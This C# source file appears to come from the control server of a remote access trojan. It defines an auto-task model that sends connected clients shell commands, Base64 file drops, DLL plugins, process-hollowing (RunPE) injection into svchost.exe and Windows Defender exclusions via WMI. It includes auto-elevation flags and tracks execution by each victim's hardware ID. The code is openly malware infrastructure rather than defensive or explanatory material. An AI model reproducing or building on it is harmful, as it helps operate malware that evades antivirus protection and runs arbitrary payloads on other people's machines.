using System.ComponentModel;
using System.Runtime.CompilerServices;

namespace SeroServer.Data;

public enum AutoTaskType
{
    File,
    ShellCommand,
    HollowExec,
    DefenderExclude,
    PluginExec,
}

public class AutoTaskEntry : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;

    public string Id { get; set; } = Guid.NewGuid().ToString("N")[..8];
    public AutoTaskType Type { get; set; } = AutoTaskType.File;
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string ShellCommand { get; set; } = string.Empty;
    public string HollowTarget { get; set; } = "svchost.exe";
    public bool AdminOnly { get; set; }
    public bool AutoElevate { get; set; }
    public long FileSize { get; set; }

    public string SizeDisplay => (Type == AutoTaskType.ShellCommand || Type == AutoTaskType.DefenderExclude) ? "—"
        : FileSize < 1024 ? $"{FileSize} B"
        : FileSize < 1024 * 1024 ? $"{FileSize / 1024.0:F1} KB"
        : $"{FileSize / (1024.0 * 1024.0):F1} MB";

    public string TypeDisplay => Type switch
    {
        AutoTaskType.ShellCommand    => AdminOnly ? "CMD (admin)" : "CMD",
        AutoTaskType.HollowExec      => "RunPE",
        AutoTaskType.DefenderExclude => "WMI Exclude",
        AutoTaskType.PluginExec      => AdminOnly ? "DLL (admin)" : "DLL",
        _ => "File"
    };

    // Backing field for thread-safe Interlocked.Increment from any thread
    public int ExecutionCountField;
    public int ExecutionCount => ExecutionCountField;

    // Call from UI thread after Interlocked.Increment to update the grid binding
    public void NotifyExecutionCount() =>
        PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(nameof(ExecutionCount)));

    /// <summary>Track by HWID so reconnecting clients don't re-execute tasks.</summary>
    public HashSet<string> ExecutedHwids { get; set; } = new();
    public DateTime AddedAt { get; set; } = DateTime.Now;
}
